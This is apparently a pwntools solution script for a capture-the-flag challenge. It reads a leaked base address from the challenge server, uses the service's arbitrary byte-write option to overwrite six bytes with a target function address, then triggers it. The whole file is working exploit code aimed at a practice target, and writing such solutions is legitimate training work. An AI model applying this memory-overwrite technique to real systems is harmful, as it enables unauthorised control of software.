from pwn import *

p = remote('challs.nusgreyhats.org', 33021)

data = p.recvuntil(b'You need to call the function at this address to win:').decode()
print("Received data:")
print(data)

data = data.split('\n')
base = data[2].split(' ')[-1]

print(f"Base address: {base}\n")

base = int(base, 16)

offsets = [0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21]
send_values = ["0x89", "0x12", "0x40", "0x00", "0x00", "0x00"]

for off, byte in zip(offsets, send_values):
    target_address = hex(base + off)
    print(f'Patching byte at offset {hex(off)} with value {byte} at address {target_address}')

    p.sendline(b'2') # Choose option 2 (write any byte)
    p.recvuntil(b'Enter the address of the byte you want to write to in hex:\n')
    p.sendline(target_address.encode())
    p.recvuntil(b'Enter the byte you want to change it to:\n')
    p.sendline(byte.encode())

p.sendline(b'3')

p.interactive()
